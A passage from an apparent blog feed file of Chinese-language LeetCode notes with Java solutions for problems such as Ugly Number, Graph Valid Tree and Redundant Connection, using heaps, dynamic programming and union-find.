class="line">        </span><br><span class="line">    <span class="comment">// 求刷到最后一栋房子的最小费用</span></span><br><span class="line">    prevMin = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> kk = <span class="number">0</span>; kk &lt; k; kk++)</span><br><span class="line">        <span class="keyword">if</span> (dp[dp.length - <span class="number">1</span>][kk] &lt; prevMin)</span><br><span class="line">            prevMin = dp[dp.length - <span class="number">1</span>][kk];</span><br><span class="line">    <span class="keyword">return</span> prevMin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码可读性很差，尤其是下标的求余操作，把它包装成函数之后，不仅可读性增加了，而且速度也变快了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> costs: n x k cost matrix</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>: an integer, the minimum cost to paint all houses</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minCostII</span><span class="params">(<span class="keyword">int</span>[][] costs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (costs == <span class="keyword">null</span> || costs.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = costs.clone();</span><br><span class="line">    <span class="keyword">int</span> k = dp[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span> prevMin = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; dp.length; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">            <span class="comment">// 刷到第i栋房子，用j颜色的费用 = </span></span><br><span class="line">            <span class="comment">// 求刷到前一栋房子i-1的最小费用 + 刷这一栋房子i的费用</span></span><br><span class="line">            dp[i][j] += minExpense(dp[i - <span class="number">1</span>], j);</span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">return</span> minExpense(dp[dp.length - <span class="number">1</span>], -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 求刷到前一栋房子的最小费用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nums: 费用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> exclusive: 当前房子的颜色，被排除在前一栋房子的颜色中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>: 刷到前一栋房子的最小费用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">minExpense</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> exclusive)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; nums.length; k++)</span><br><span class="line">        <span class="keyword">if</span> (k != exclusive &amp;&amp; nums[k] &lt; min)</span><br><span class="line">            min = nums[k];</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[264. Ugly Number II]]></title>
      <url>/wiki/2017/10/30/Leetcode-264-Ugly-Number-II/</url>
      <content type="html"><![CDATA[<p>Write a program to find the $n$-th ugly number.</p>
<p>Ugly numbers are positive numbers whose prime factors only include <code>2, 3, 5</code>. </p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 10</span><br><span class="line">Output: 12</span><br><span class="line">Explanation: 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 is the sequence of the first 10 ugly numbers.</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:  </p>
<ul>
<li>1 is typically treated as an ugly number.</li>
<li>$n$ does not exceed 1690.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是263. Ugly Number的延伸，要求给出前$n$个丑数。丑数的质因数只包含2，3，5。所以一个丑数可以表示为$2^{t_2}3^{t_3}5^{t_5}$，其中$t_2,t_3,t_5$为自然数。一种最简单的方法是，求出丑数，然后取出前$n$个值。由于不好判断丑树的顺序，所以采用最小二叉堆来保存。 算法时间复杂度为$n\log(n)$，因为每添加/删除一个元素的时间复杂度是$\log(n)$，一共有$n$个循环，空间复杂度是$O(n)$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">nthUglyNumber</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    PriorityQueue&lt;Long&gt; q = <span class="keyword">new</span> PriorityQueue(); <span class="comment">// 注意Long</span></span><br><span class="line">    q.offer(<span class="number">1l</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">long</span> min = q.poll();</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty() &amp;&amp; q.peek() == min) q.poll();</span><br><span class="line"></span><br><span class="line">        q.offer(min*<span class="number">2</span>);</span><br><span class="line">        q.offer(min*<span class="number">3</span>);</span><br><span class="line">        q.offer(min*<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> q.poll().intValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用动态规划能将时间和空间复杂度降低为$O(n)$。在最开始，丑数为1，即<code>uglyNumber[0] = 1</code>，$t_2,t_3,t_5$都为0， 然后</p>
<ul>
<li><code>uglyNumber[1] = Math.min(uglyNumber[0]*2, uglyNumber[0]*3, uglyNumber[0]*5)</code>，结果是<code>uglyNumber[0]*2</code>, 所以把$t_2$变成1.</li>
<li>继续<code>uglyNumber[2] = Math.min(uglyNumber[1]*2, uglyNumber[0]*3, uglyNumber[0]*5)</code>.</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">nthUglyNumber</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> t2 = <span class="number">0</span>, t3 = <span class="number">0</span>, t5 = <span class="number">0</span>; <span class="comment">// pointers for 2, 3, 5</span></span><br><span class="line">    <span class="keyword">int</span>[] uglyNumber = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    uglyNumber[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i  = <span class="number">1</span>; i &lt; n ; i ++)&#123;</span><br><span class="line">        uglyNumber[i] = Math.min(uglyNumber[t2] * <span class="number">2</span>, </span><br><span class="line">                                 Math.min(uglyNumber[t3] * <span class="number">3</span>,uglyNumber[t5] * <span class="number">5</span>));</span><br><span class="line">        <span class="keyword">if</span>(uglyNumber[i] == uglyNumber[t2]*<span class="number">2</span>) t2++; </span><br><span class="line">        <span class="keyword">if</span>(uglyNumber[i] == uglyNumber[t3]*<span class="number">3</span>) t3++;</span><br><span class="line">        <span class="keyword">if</span>(uglyNumber[i] == uglyNumber[t5]*<span class="number">5</span>) t5++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> uglyNumber[n-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Math </tag>
            
            <tag> Heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[263. Ugly Number]]></title>
      <url>/wiki/2017/10/30/Leetcode-263-Ugly-Number/</url>
      <content type="html"><![CDATA[<p>Write a program to check whether a given number is an ugly number.</p>
<p>Ugly numbers are <strong>positive numbers</strong> whose prime factors only include <code>2, 3, 5</code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 6</span><br><span class="line">Output: true</span><br><span class="line">Explanation: 6 = 2 × 3</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 8</span><br><span class="line">Output: true</span><br><span class="line">Explanation: 8 = 2 × 2 × 2</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 14</span><br><span class="line">Output: false </span><br><span class="line">Explanation: 14 is not ugly since it includes another prime factor 7.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>1 is typically treated as an ugly number.</li>
<li>Input is within the 32-bit signed integer range: [−$2^{31}$,  $2^{31}$ − 1].</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目如果直接按照题目的描述来解决：$n$试着处以任何一个小于$n$的整数，结果只有2,3,5可以整除的$n$是ugly number。这很显然不行，因为当$n$很大的时候，这个循环得多大啊。</p>
<p>利用逆向思维，既然只能被2,3,5整除，那就整除这些数字，看最后结果是不是1。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUgly</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 负数不是ugly number</span></span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 如果能被2,3,5整除，就整除</span></span><br><span class="line">    <span class="keyword">while</span>(num % <span class="number">2</span> == <span class="number">0</span>) num /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(num % <span class="number">3</span> == <span class="number">0</span>) num /= <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">while</span>(num % <span class="number">5</span> == <span class="number">0</span>) num /= <span class="number">5</span> ;</span><br><span class="line">    <span class="keyword">return</span> num == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[261. Graph Valid Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-261-Graph-Valid-Tree/</url>
      <content type="html"><![CDATA[<p>Given n nodes labeled from 0 to $n - 1$ and a list of undirected edges (each edge is a pair of nodes), write a function to check whether these edges make up a valid tree.</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Given n = 5 and edges = [[0, 1], [0, 2], [0, 3], [1, 4]], return true.</span><br><span class="line">Given n = 5 and edges = [[0, 1], [1, 2], [2, 3], [1, 3], [1, 4]], return false.</span><br></pre></td></tr></table></figure>
<p>Hint:</p>
<ol>
<li>Given n = 5 and edges = [[0, 1], [1, 2], [3, 4]], what should your return? Is this case a valid tree?</li>
<li>According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>LeetCode这道题目需要收费，参见<a href="https://www.lintcode.com/problem/graph-valid-tree/description">LintCode</a>。</p>
<blockquote>
<p> A tree is an acyclic connected graph.</p>
</blockquote>
<p>判断无向图是否为树。图论基本算法。图为树的先决条件是1.无环，2.可连通。判断无向图有环的方法有bfs、dfs、并查集，判断可连接的方法还是有bfs、dfs、并查集。 无向图的环的判断可参考<a href="http://larryim.cc/note-os/algorithm/algorithmPrinceton/graph/#cycle">这里</a>。</p>
<p>使用并查集(weighted-path with compression)：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n: An integer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> edges: a list of undirected edges</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>: true if it's a valid tree, or false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validTree</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span>[][] edges)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// special case, 0 vertex</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> [] id = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">int</span> [] size = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化id</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        id[i] = i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 确认图是否有环</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>[] edge : edges) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = edge[<span class="number">0</span>], w = edge[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 遍历所有边，查找到边的顶点所在的集合，如果相同，则有环</span></span><br><span class="line">        <span class="keyword">int</span> i = find(id, v), j = find(id, w);</span><br><span class="line">        <span class="keyword">if</span> (i == j) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        union(id, size, i, j);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 确认图是否连通</span></span><br><span class="line">    <span class="keyword">int</span> group = find(id, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">1</span>; v &lt; n; v++)</span><br><span class="line">        <span class="keyword">if</span> (find(id, v) != group) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// union v and w</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span>[] id, <span class="keyword">int</span>[] size, <span class="keyword">int</span> v, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// find roots of v and w</span></span><br><span class="line">    <span class="keyword">int</span> i = find(id, v);</span><br><span class="line">    <span class="keyword">int</span> j = find(id, w);</span><br><span class="line">    <span class="keyword">if</span> (i == j) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// link the root of small tree to large tree</span></span><br><span class="line">    <span class="keyword">if</span> (size[i] &gt; size[j]) &#123;id[j] = i; size[i] += size[j];&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;id[i] = j; size[j] += size[i];&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>[] id, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (id[v] != v) &#123;</span><br><span class="line">        <span class="comment">// point to its grandparent;</span></span><br><span class="line">        id[v] = id[id[v]];</span><br><span class="line">        v = id[v];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并查集的方案是最快的，beat 100%。因为使用DFS和BFS需要构建图。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Union Find </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[685. Redundant Connection II]]></title>
      <url>/wiki/2017/10/30/Leetcode-685-Redundant-Connection-II/</url>
      <content type="html"><![CDATA[<p>In this problem, a rooted tree is a <strong>directed</strong> graph such that, there is exactly one node (the root) for which all other nodes are descendants of this node, plus every node has exactly one parent, except for the root node which has no parents.</p>
<p>The given input is a directed graph that started as a rooted tree with $N$ nodes (with distinct values $1, 2, …, N$), with one additional directed edge added. The added edge has two different vertices chosen from 1 to $N$, and was not an edge that already existed.</p>
<p>The resulting graph is given as a 2D-array of <code>edges</code>. Each element of <code>edges</code> is a pair [$u$, $v$] that represents a directed edge connecting nodes $u$ and $v$, where $u$ is a parent of child $v$.</p>
<p>Return an edge that can be removed so that the resulting graph is a rooted tree of $N$ nodes. If there are multiple answers, return the answer that occurs last in the given 2D-array.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,2], [1,3], [2,3]]</span><br><span class="line">Output: [2,3]</span><br><span class="line">Explanation: The given directed graph will be like this:</span><br><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">v   v</span><br><span class="line">2--&gt;3</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,2], [2,3], [3,4], [4,1], [1,5]]</span><br><span class="line">Output: [4,1]</span><br><span class="line">Explanation: The given directed graph will be like this:</span><br><span class="line">5 &lt;- 1 -&gt; 2</span><br><span class="line">     ^    |</span><br><span class="line">     |    v</span><br><span class="line">     4 &lt;- 3</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The size of the input 2D-array will be between 3 and 1000.</li>
<li>Every integer represented in the 2D-array will be between 1 and $N$, where $N$ is the size of the input array.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Union Find </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[684. Redundant Connection]]></title>
      <url>/wiki/2017/10/30/Leetcode-684-Redundant-Connection/</url>
      <content type="html"><![CDATA[<p>In this problem, a tree is an <strong>undirected</strong> graph that is connected and has no cycles.</p>
<p>The given input is a graph that started as a tree with $N$ nodes (with distinct values 1, 2, …, $N$), with one additional edge added. The added edge has two different vertices chosen from 1 to $N$, and was not an edge that already existed.</p>
<p>The resulting graph is given as a 2D-array of <code>edges</code>. Each element of <code>edges</code> is a pair [$u$, $v$] with $u &lt; v$, that represents an undirected edge connecting nodes $u$ and $v$.</p>
<p>Return an edge that can be removed so that the resulting graph is a tree of $N$ nodes. If there are multiple answers, return the answer that occurs last in the given 2D-array. The answer edge [$u$, $v$] should be in the same format, with $u &lt; v$.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,2], [1,3], [2,3]]</span><br><span class="line">Output: [2,3]</span><br><span class="line">Explanation: The given undirected graph will be like this:</span><br><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">2 - 3</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,2], [2,3], [3,4], [1,4], [1,5]]</span><br><span class="line">Output: [1,4]</span><br><span class="line">Explanation: The given undirected graph will be like this:</span><br><span class="line">5 - 1 - 2</span><br><span class="line">    |   |</span><br><span class="line">    4 - 3</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The size of the input 2D-array will be between 3 and 1000.</li>
<li>Every integer represented in the 2D-array will be between 1 and $N$, where $N$ is the size of the input array.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目考查图论的基本操作-检测无向图的是否有环。类似于LeetCode261. Graph Valid Tree，换汤不换药。具体方法是：使用并查集存放连通域，将每一条边的两个节点执行并(union)操作，如果存在环，那么这两个顶点一定已经在同一连通域中，返回这条边；否则不存在环。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findRedundantConnection(<span class="keyword">int</span>[][] edges) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = edges.length;</span><br><span class="line">        <span class="keyword">int</span>[] id = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>], size = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> v = <span class="number">1</span>; v &lt;= n; v++) id[v] = v;</span><br><span class="line">        <span class="keyword">int</span> v, w, i, j;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] edge : edges) &#123;</span><br><span class="line">            v = edge[<span class="number">0</span>]; w = edge[<span class="number">1</span>];</span><br><span class="line">            i = find(id, v); j = find(id, w);</span><br><span class="line">            <span class="keyword">if</span> (i == j) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;v, w&#125;;</span><br><span class="line">            union(id, size, v, w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span>[] id, <span class="keyword">int</span>[] size, <span class="keyword">int</span> v, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = find(id, v);</span><br><span class="line">        <span class="keyword">int</span> j = find(id, w);</span><br><span class="line">        <span class="keyword">if</span> (i == j) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (size[i] &gt; size[j]) &#123;</span><br><span class="line">            id[j] = i;</span><br><span class="line">            size[i] += size[j];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            id[i] = j;</span><br><span class="line">            size[j] += size[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>[] id, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (i != id[i]) &#123;</span><br><span class="line">            id[i] = id[id[i]];</span><br><span class="line">            i = id[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Union Find </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[257. Binary Tree Paths]]></title>
      <url>/wiki/2017/10/30/Leetcode-257-Binary-Tree-Paths/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, return all root-to-leaf paths.</p>
<p>Note: A leaf is a node with no children.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">   1</span><br><span class="line"> /   \</span><br><span class="line">2     3</span><br><span class="line"> \</span><br><span class="line">  5</span><br><span class="line">Output: [&quot;1-&gt;2-&gt;5&quot;, &quot;1-&gt;3&quot;]</span><br><span class="line">Explanation: All root-to-leaf paths are: 1-&gt;2-&gt;5, 1-&gt;3</span><br></pre></td></tr></table></figure>
